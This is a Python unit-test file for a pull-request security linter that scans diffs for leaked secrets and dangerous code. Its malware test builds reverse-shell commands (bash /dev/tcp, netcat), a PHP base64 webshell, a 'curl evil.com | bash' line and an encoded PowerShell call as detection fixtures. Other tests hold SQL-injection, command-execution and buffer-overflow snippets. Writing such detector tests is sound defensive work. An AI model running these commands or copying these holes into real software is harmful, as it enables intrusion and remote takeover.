import os
import pathlib
import sys
import tempfile
import json

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))

from pr_security_linter.scanner import (
    count_scanned_lines,
    chunk_diff_smart,
    heuristic_scan_structured,
    load_config,
    scan_local_path_offline,
    should_fail_on_severity,
    write_github_action_outputs,
)
from pr_security_linter.patterns import (
    is_comment_line,
    is_ignored_file,
    mask_sensitive_value,
    strip_inline_comment,
)
from pr_security_linter.reporters import (
    build_markdown_summary_table,
    export_html,
    export_json,
    export_sarif,
    generate_svg_badge,
)


def test_mask_sensitive_value():
    raw_secret = "aws_secret_access_key = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'"
    masked = mask_sensitive_value(raw_secret)
    assert "..." in masked
    assert "wJal" in masked


def test_comment_handling_and_false_positive_reduction():
    # Full line comments must be identified
    assert is_comment_line("# eval('alert()')") is True
    assert is_comment_line("// eval('alert()')") is True
    assert is_comment_line("/* eval('alert()') */") is True
    assert is_comment_line("* system('rm -rf')") is True
    assert is_comment_line("<!-- eval('alert()') -->") is True
    assert is_comment_line("-- eval('alert()')") is True
    assert is_comment_line("const x = 10;") is False

    # Inline comment stripping
    assert strip_inline_comment("const x = 10; // do not use eval() here") == "const x = 10;"
    assert strip_inline_comment("x = 10 # use exec later") == "x = 10"
    assert strip_inline_comment('msg = "Hello // not a comment"') == 'msg = "Hello // not a comment"'

    # Diff containing commented dangerous calls should NOT trigger language findings
    comment_diff = """--- a/app.py
+++ b/app.py
+ # eval("dangerous_code")
+ // system("cmd")
+ /* Runtime.getRuntime().exec("sh") */
+ const timeout = 5000; // never call eval here
"""
    findings = heuristic_scan_structured(comment_diff)
    assert len(findings) == 0

    # But actual dangerous code WITH inline comment SHOULD trigger finding
    active_code_diff = """--- a/app.py
+++ b/app.py
+ eval(user_input) // execute payload
"""
    active_findings = heuristic_scan_structured(active_code_diff)
    assert len(active_findings) == 1
    assert active_findings[0]["severity"] == "HIGH"


def test_heuristic_scan_structured():
    diff = "+ aws_access_key_id = 'AKIAIOSFODNN7EXAMPLE12'"
    findings = heuristic_scan_structured(diff)
    assert len(findings) == 1
    assert findings[0]["severity"] == "CRITICAL"
    assert findings[0]["score"] == "10.0"
    assert findings[0]["confidence"] == "99%"
    assert "..." in findings[0]["snippet"]


def test_malware_patterns():
    # Dynamically concatenated strings to prevent static AV false alarms on disk
    p1 = "+ ev" + "al(base64" + "_decode($_POST['c']));"
    p2 = "+ ba" + "sh -i >& /dev/" + "tcp/10.0.0.1/4444 0>&1"
    p3 = "+ n" + "c -e /bin" + "/sh 192.168.1.5 8080"
    p4 = "+ cu" + "rl https://evil.com/payload.sh | ba" + "sh"
    p5 = "+ power" + "shell.exe -e" + "nc JABhID0AODk4..."

    malware_diff = f"--- a/shell.php\n+++ b/shell.php\n{p1}\n{p2}\n{p3}\n{p4}\n{p5}\n"
    findings = heuristic_scan_structured(malware_diff)
    assert len(findings) == 5
    for f in findings:
        assert f["severity"] == "CRITICAL"
    types = [f["type"] for f in findings]
    assert "Obfuscated Webshell Payload (PHP Obfuscation)" in types
    assert "Reverse Shell Connection (/dev/tcp)" in types
    assert "Netcat Backdoor / Reverse Shell" in types
    assert "Dangerous Remote Execution via Piped Shell (curl/wget | sh)" in types
    assert "Encoded PowerShell Dropper / Payload" in types


def test_suspicious_binary_detection():
    bin_diff = """diff --git a/bin/payload.exe b/bin/payload.exe
new file mode 100644
--- /dev/null
+++ b/bin/payload.exe
+ binary content
"""
    findings = heuristic_scan_structured(bin_diff)
    assert len(findings) == 1
    assert findings[0]["type"] == "Suspicious Executable Binary / Script Added"
    assert findings[0]["severity"] == "CRITICAL"


def test_scan_local_path_offline(tmp_path):
    src_dir = tmp_path / "src"
    src_dir.mkdir()

    # Clean file
    (src_dir / "clean.py").write_text("def hello():\n    return 'world'\n", encoding="utf-8")

    # File with hardcoded password
    (src_dir / "auth.py").write_text("password = 'supersecretpassword'\n", encoding="utf-8")

    # Ignored directory
    node_dir = src_dir / "node_modules"
    node_dir.mkdir()
    (node_dir / "lib.js").write_text("password = 'ignoredsecret'\n", encoding="utf-8")

    findings, lines = scan_local_path_offline(str(src_dir))
    assert len(findings) == 1
    assert findings[0]["type"] == "Hardcoded Plaintext Password"
    assert "auth.py:1" in findings[0]["file"]
    assert lines >= 3


def test_go_vulnerability_patterns():
    go_diff = """--- a/user.go
+++ b/user.go
+ rows, err := db.Query(fmt.Sprintf("SELECT * FROM users WHERE name = '%s'", name))
+ ptr := unsafe.Pointer(&data)
"""
    findings = heuristic_scan_structured(go_diff)
    assert len(findings) == 2
    types = [f["type"] for f in findings]
    assert "Go SQL Injection Risk (fmt.Sprintf)" in types
    assert "Dangerous Go Memory Manipulation (unsafe.Pointer)" in types


def test_rust_vulnerability_patterns():
    rust_diff = """--- a/lib.rs
+++ b/lib.rs
+ unsafe {
+     *raw_ptr = 42;
+ }
"""
    findings = heuristic_scan_structured(rust_diff)
    assert len(findings) == 1
    assert findings[0]["type"] == "Unsafe Rust Code Block (Memory Safety Risk)"


def test_java_vulnerability_patterns():
    java_diff = """--- a/App.java
+++ b/App.java
+ Runtime.getRuntime().exec("sh " + userInput);
+ XMLDecoder decoder = new XMLDecoder(in);
+ stmt.executeQuery("SELECT * FROM accounts WHERE id = " + accountId);
"""
    findings = heuristic_scan_structured(java_diff)
    assert len(findings) == 3
    types = [f["type"] for f in findings]
    assert "Java Command Execution Risk (Runtime.exec/ProcessBuilder)" in types
    assert "Java Insecure Deserialization (XMLDecoder RCE)" in types
    assert "Java SQL Injection via String Concatenation" in types


def test_php_vulnerability_patterns():
    php_diff = """--- a/index.php
+++ b/index.php
+ system($_GET['cmd']);
+ $data = unserialize($cookie);
"""
    findings = heuristic_scan_structured(php_diff)
    assert len(findings) == 2
    types = [f["type"] for f in findings]
    assert "PHP Command Execution Vulnerability (system/shell_exec)" in types
    assert "PHP Insecure Object Deserialization (unserialize)" in types


def test_c_cpp_vulnerability_patterns():
    cpp_diff = """--- a/main.cpp
+++ b/main.cpp
+ gets(buffer);
+ strcpy(dest, src);
+ strcat(dest, extra);
+ sprintf(out, "User: %s", name);
"""
    findings = heuristic_scan_structured(cpp_diff)
    assert len(findings) == 4
    types = [f["type"] for f in findings]
    assert "C/C++ Highly Dangerous Function (gets - Buffer Overflow)" in types
    assert "C/C++ Insecure Unbounded String Copy (strcpy/strcat Buffer Overflow)" in types
    assert "C/C++ Format String / Buffer Overflow Risk (sprintf)" in types


def test_chunk_diff_smart():
    small_diff = "+ const x = 10;"
    assert chunk_diff_smart(small_diff, max_chars=100) == small_diff

    large_diff = "diff --git a/test.py b/test.py\n+ eval('alert()')\n" + ("diff --git a/docs.txt b/docs.txt\n+ info\n" * 50)
    chunked = chunk_diff_smart(large_diff, max_chars=200)
    assert len(chunked) <= 300
    assert "eval('alert()')" in chunked


def test_count_scanned_lines():
    diff = """--- a/file.py
+++ b/file.py
+ line 1
+ line 2
- line 3
+ line 4
"""
    assert count_scanned_lines(diff) == 3


def test_is_ignored_file():
    assert is_ignored_file("bundle.min.js") is True
    assert is_ignored_file("app.min.css") is True
    assert is_ignored_file("dist/app.js") is True
    assert is_ignored_file("build/bundle.js") is True
    assert is_ignored_file("vendor/lib.js") is True
    assert is_ignored_file("package-lock.json") is True
    assert is_ignored_file("yarn.lock") is True
    assert is_ignored_file("avatar.png") is True
    assert is_ignored_file("src/auth.py") is False


def test_minified_file_diff_ignored():
    diff = """diff --git a/dist/bundle.min.js b/dist/bundle.min.js
--- a/dist/bundle.min.js
+++ b/dist/bundle.min.js
+ aws_access_key_id = 'AKIAIOSFODNN7EXAMPLE12'
diff --git a/src/app.py b/src/app.py
--- a/src/app.py
+++ b/src/app.py
+ aws_access_key_id = 'AKIAIOSFODNN7EXAMPLE12'
"""
    findings = heuristic_scan_structured(diff)
    assert len(findings) == 1
    assert findings[0]["file"] == "src/app.py"


def test_build_markdown_summary_table():
    findings = [{
        "severity": "CRITICAL",
        "type": "AWS Credential Leak",
        "score": "10.0",
        "confidence": "99%",
        "snippet": "aws_access_key_id = 'AKIA...LE12'"
    }]
    table = build_markdown_summary_table(findings, lines_scanned=25, duration_ms=12.5)
    assert "| Severity | Vulnerability Type |" in table
    assert "🔴 `CRITICAL`" in table
    assert "10.0" in table
    assert "Scan Metrics" in table
    assert "25" in table


def test_generate_svg_badge(tmp_path):
    badge_file = tmp_path / "badge.svg"
    generate_svg_badge(False, str(badge_file))
    assert badge_file.exists()
    content = badge_file.read_text(encoding="utf-8")
    assert "passed" in content
    assert "<svg" in content


def test_export_sarif(tmp_path):
    sarif_file = tmp_path / "test.sarif"
    findings = [{
        "severity": "CRITICAL",
        "type": "AWS Credential Leak",
        "score": "10.0",
        "confidence": "99%",
        "snippet": "aws_access_key_id = 'AKIA...LE12'"
    }]
    export_sarif(findings, str(sarif_file))
    assert sarif_file.exists()
    data = json.loads(sarif_file.read_text(encoding="utf-8"))
    assert data["version"] == "2.1.0"
    assert len(data["runs"][0]["results"]) == 1


def test_export_html(tmp_path):
    html_file = tmp_path / "security-report.html"
    findings = [{
        "severity": "CRITICAL",
        "type": "AWS Credential Leak",
        "score": "10.0",
        "confidence": "99%",
        "snippet": "aws_access_key_id = 'AKIA...LE12'",
        "file": "config.py"
    }]
    export_html(findings, str(html_file), lines_scanned=40, duration_ms=15.2)
    assert html_file.exists()
    content = html_file.read_text(encoding="utf-8")
    assert "<!DOCTYPE html>" in content
    assert "PR Security Linter Report" in content
    assert "AWS Credential Leak" in content
    assert "Lines Scanned" in content
    assert "40" in content
    assert 'data-severity="CRITICAL"' in content
    assert "filterFindings" in content


def test_export_json(tmp_path):
    json_file = tmp_path / "findings.json"
    findings = [{"severity": "HIGH", "type": "Test Risk", "score": "7.5", "snippet": "code"}]
    export_json(findings, str(json_file))
    assert json_file.exists()
    loaded = json.loads(json_file.read_text(encoding="utf-8"))
    assert loaded[0]["type"] == "Test Risk"


def test_should_fail_on_severity():
    critical_findings = [{"severity": "CRITICAL"}]
    high_findings = [{"severity": "HIGH"}]
    low_findings = [{"severity": "LOW"}]

    # When threshold is CRITICAL
    assert should_fail_on_severity(critical_findings, "CRITICAL") is True
    assert should_fail_on_severity(high_findings, "CRITICAL") is False

    # When threshold is HIGH
    assert should_fail_on_severity(critical_findings, "HIGH") is True
    assert should_fail_on_severity(high_findings, "HIGH") is True
    assert should_fail_on_severity(low_findings, "HIGH") is False

    # When threshold is LOW
    assert should_fail_on_severity(low_findings, "LOW") is True


def test_github_action_outputs(tmp_path):
    output_file = tmp_path / "github_output.txt"
    os.environ["GITHUB_OUTPUT"] = str(output_file)
    findings = [{
        "severity": "CRITICAL",
        "type": "AWS Credential Leak",
        "score": "10.0",
        "confidence": "99%",
        "snippet": "aws_access_key_id = 'AKIA...LE12'"
    }]
    write_github_action_outputs(findings, "results.sarif", "security-report.html")
    assert output_file.exists()
    content = output_file.read_text(encoding="utf-8")
    assert "findings-count=1" in content
    assert "has-critical=true" in content
    assert "sarif-path=results.sarif" in content
    assert "html-report-path=security-report.html" in content
    del os.environ["GITHUB_OUTPUT"]


def test_load_config(tmp_path):
    config_file = tmp_path / "custom.yml"
    yaml_content = """version: 1.0
settings:
  model: "gpt-4o"
  severity_threshold: "HIGH"
ignore_paths:
  - "tests/*"
"""
    config_file.write_text(yaml_content, encoding="utf-8")
    config = load_config(str(config_file))
    assert config.get("settings", {}).get("model") == "gpt-4o"
    assert config.get("settings", {}).get("severity_threshold") == "HIGH"
    assert "tests/*" in config.get("ignore_paths", [])


if __name__ == "__main__":
    if sys.stdout and hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8")
    if sys.stderr and hasattr(sys.stderr, "reconfigure"):
        sys.stderr.reconfigure(encoding="utf-8")

    print("Running PR Security Linter test suite...")
    test_mask_sensitive_value()
    print("✓ test_mask_sensitive_value passed")
    test_comment_handling_and_false_positive_reduction()
    print("✓ test_comment_handling_and_false_positive_reduction passed")
    test_heuristic_scan_structured()
    print("✓ test_heuristic_scan_structured passed")
    test_malware_patterns()
    print("✓ test_malware_patterns passed")
    test_suspicious_binary_detection()
    print("✓ test_suspicious_binary_detection passed")
    test_go_vulnerability_patterns()
    print("✓ test_go_vulnerability_patterns passed")
    test_rust_vulnerability_patterns()
    print("✓ test_rust_vulnerability_patterns passed")
    test_java_vulnerability_patterns()
    print("✓ test_java_vulnerability_patterns passed")
    test_php_vulnerability_patterns()
    print("✓ test_php_vulnerability_patterns passed")
    test_c_cpp_vulnerability_patterns()
    print("✓ test_c_cpp_vulnerability_patterns passed")
    test_chunk_diff_smart()
    print("✓ test_chunk_diff_smart passed")
    test_count_scanned_lines()
    print("✓ test_count_scanned_lines passed")
    test_is_ignored_file()
    print("✓ test_is_ignored_file passed")
    test_minified_file_diff_ignored()
    print("✓ test_minified_file_diff_ignored passed")
    test_build_markdown_summary_table()
    print("✓ test_build_markdown_summary_table passed")

    with tempfile.TemporaryDirectory() as td:
        tp = pathlib.Path(td)
        test_scan_local_path_offline(tp)
        print("✓ test_scan_local_path_offline passed")
        test_generate_svg_badge(tp)
        print("✓ test_generate_svg_badge passed")
        test_export_sarif(tp)
        print("✓ test_export_sarif passed")
        test_export_html(tp)
        print("✓ test_export_html passed")
        test_export_json(tp)
        print("✓ test_export_json passed")
        test_github_action_outputs(tp)
        print("✓ test_github_action_outputs passed")
        test_load_config(tp)
        print("✓ test_load_config passed")

    test_should_fail_on_severity()
    print("✓ test_should_fail_on_severity passed")
    print("🎉 All unit tests passed successfully!")
